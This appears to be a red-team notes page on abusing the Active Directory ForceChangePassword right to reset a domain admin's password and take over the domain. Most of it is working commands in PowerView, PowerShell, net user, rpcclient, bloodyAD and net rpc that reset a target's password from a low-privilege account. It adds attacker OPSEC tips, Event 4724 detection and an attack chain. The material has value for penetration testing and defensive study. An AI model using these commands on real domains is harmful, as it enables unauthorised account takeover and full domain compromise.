---
title: "Attack #23 — ForceChangePassword Abuse"
description: "ForceChangePassword (also known as User-Force-Change-Password extended right) allows a principal to reset another user's password without knowing their…"
category: active-directory
subcategory: "ACL Abuse"
tags: ["active-directory", "delegation", "privilege-escalation"]
tools: ["Impacket", "PowerShell"]
difficulty: advanced
updated: "2026-08-10"
source: "vault:ActiveDirectory/AD-Attack/Category-Three/🟡 Attack #23 — ForceChangePassword Abuse.md"
---
# 🟡 Attack #23 — ForceChangePassword Abuse

***

## 📖 How It Works

ForceChangePassword (also known as `User-Force-Change-Password` extended right) allows a principal to **reset another user's password without knowing their current password**. Unlike GenericAll or GenericWrite, this is a **single-purpose ACE** — it can only reset the password, nothing else. However, if the target is a Domain Admin or service account, one password reset is all you need for full domain compromise.

This right is commonly granted to helpdesk groups, IT support teams, and password reset delegations — and is frequently over-scoped to include privileged accounts.

***

## ⚙️ Prerequisites

| Requirement | Detail |
|---|---|
| **ForceChangePassword/User-Force-Change-Password on target** | Extended right in the target user's DACL |
| **Domain user account** | Any authenticated domain user with this right |

***

## 🛠️ Tools

| Tool | Platform | Notes |
|---|---|---|
| **PowerView** | Windows | `Set-DomainUserPassword` |
| **net user** | Windows | Native Windows command |
| **rpcclient** | Linux | RPC-based password reset |
| **bloodyAD** | Linux | `set password` command |
| **Impacket** | Linux | Various methods for password reset |

***

## 💻 Full Commands

### 🔴 Password Reset Exploitation

```powershell
# ── PowerView ─────────────────────────────────────────────────────────────────
$NewPassword = ConvertTo-SecureString 'P@ssword123!' -AsPlainText -Force
Set-DomainUserPassword -Identity targetadmin -AccountPassword $NewPassword -Verbose

# ── Native PowerShell ─────────────────────────────────────────────────────────
Set-ADAccountPassword -Identity targetadmin -NewPassword (
  ConvertTo-SecureString 'P@ssword123!' -AsPlainText -Force
) -Reset

# ── net user ──────────────────────────────────────────────────────────────────
net user targetadmin P@ssword123! /domain
```

```bash
# ── rpcclient ─────────────────────────────────────────────────────────────────
rpcclient -U 'corp.local/low_user%Password1' DC01.corp.local \
  -c "setuserinfo2 targetadmin 23 P@ssword123!"

# ── bloodyAD ──────────────────────────────────────────────────────────────────
bloodyAD -d corp.local -u low_user -p 'Password1' --host DC01.corp.local \
  set password targetadmin 'P@ssword123!'

# ── Impacket — net rpc ────────────────────────────────────────────────────────
net rpc password targetadmin 'P@ssword123!' -U 'corp.local/low_user%Password1' \
  -S DC01.corp.local
```

***

## 🎯 OPSEC Tips

- **Password resets are LOUD** — the target user will notice immediately if they can't log in
- **Event 4724 is generated** on every password reset — easy to detect and correlate
- **Consider Shadow Credentials instead** if you have GenericWrite — it doesn't change the password
- **Some accounts have "cannot change password" set** — ForceChangePassword bypasses this, but the event is still logged

***

## 🛡️ Detection — Event IDs

| Event ID | Source | What to Look For |
|---|---|---|
| **4724** | Security Log (DC) | Password reset by a non-helpdesk account targeting a privileged user |
| **4723** | Security Log (DC) | User attempted to change their own password (not relevant here) |

***

## 🔗 Attack Chain Context

```
[ForceChangePassword] ──→ Account Takeover via Password Reset
         │
         ├──→ 🔑 Reset DA password → instant domain compromise
         ├──→ ⚠️ Loudest ACL attack — user notices immediately
         ├──→ 🔗 Prefer: Shadow Credentials (#25) if GenericWrite available
         └──→ 💀 Defeated by: monitor 4724, restrict password reset delegation
```

***

> ✅ **Attack #23 — ForceChangePassword Abuse complete.**
